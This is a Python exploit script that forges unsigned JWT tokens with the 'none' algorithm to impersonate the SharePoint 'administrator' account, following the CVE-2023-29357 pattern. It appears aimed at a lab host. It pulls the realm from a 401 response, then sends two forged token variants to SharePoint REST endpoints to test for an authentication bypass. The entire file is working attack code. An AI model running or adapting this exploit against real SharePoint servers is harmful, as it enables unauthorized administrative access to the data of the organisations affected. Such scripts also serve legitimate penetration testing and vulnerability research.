# Purpose: Test JWT "none" algorithm authentication bypass (CVE-2023-29357 pattern)
# Outcome: Check if v2 SharePoint accepts unsigned JWT tokens for auth bypass

import base64
import json
import time
import requests

def b64url_encode(data):
    """Base64 URL encode without padding"""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def create_jwt_none(payload_data):
    """Create a JWT token with alg: none (no signature)"""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header))
    payload_b64 = b64url_encode(json.dumps(payload_data))
    # JWT with no signature: header.payload.
    return f"{header_b64}.{payload_b64}."

# Target configuration
target_base = "http://10.10.10.166"
client_id = "00000003-0000-0ff1-ce00-000000000000"
# Use a placeholder realm - we'll try to extract the real one
realm = "test-realm"

# Test endpoints
test_endpoints = [
    "/_api/web/siteusers",
    "/_api/web/currentuser",
    "/_api/web",
    "/_api/contextinfo",
    "/_vti_bin/client.svc"
]

# First, try to get the realm from WWW-Authenticate header
print("[*] Step 1: Attempting to extract realm from 401 response...")
try:
    r = requests.get(f"{target_base}/_api/web/siteusers", 
                     headers={"Authorization": "Bearer "},
                     timeout=10,
                     verify=False)
    print(f"[*] Status: {r.status_code}")
    print(f"[*] Headers: {dict(r.headers)}")
    if 'WWW-Authenticate' in r.headers:
        www_auth = r.headers['WWW-Authenticate']
        print(f"[*] WWW-Authenticate: {www_auth}")
        # Try to extract realm
        if 'realm=' in www_auth.lower():
            parts = www_auth.split('realm=')
            if len(parts) > 1:
                realm = parts[1].split(',')[0].strip('"').strip("'")
                print(f"[*] Extracted realm: {realm}")
except Exception as e:
    print(f"[!] Error: {e}")

# Step 2: Construct and test JWT tokens
print("\n[*] Step 2: Testing JWT tokens with 'none' algorithm...")

now = int(time.time())
payload_variants = [
    # Basic JWT payload
    {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": now - 300,
        "exp": now + 3600,
        "ver": "hashedprooftoken",
        "nameid": "administrator",
        "nii": "urn:office:idp:activedirectory",
        "endpointurl": "",
        "endpointurlLength": 1,
        "isloopback": True,
        "isuser": True
    },
    # With hardcoded endpoint hash
    {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": now - 300,
        "exp": now + 3600,
        "ver": "hashedprooftoken",
        "nameid": "administrator",
        "nii": "urn:office:idp:activedirectory",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True,
        "isuser": True
    }
]

for i, payload in enumerate(payload_variants):
    jwt_token = create_jwt_none(payload)
    print(f"\n[*] Testing JWT variant {i+1}:")
    print(f"    Token (first 100 chars): {jwt_token[:100]}...")
    
    for endpoint in test_endpoints[:3]:  # Test first 3 endpoints
        try:
            headers = {
                "Authorization": f"Bearer {jwt_token}",
                "X-PROOF_TOKEN": jwt_token,
                "Accept": "application/json;odata=verbose"
            }
            r = requests.get(f"{target_base}{endpoint}", headers=headers, timeout=10, verify=False)
            print(f"    {endpoint}: {r.status_code} - {r.text[:200] if r.text else 'No body'}")
        except Exception as e:
            print(f"    {endpoint}: Error - {e}")

print("\n[*] JWT auth bypass test complete")
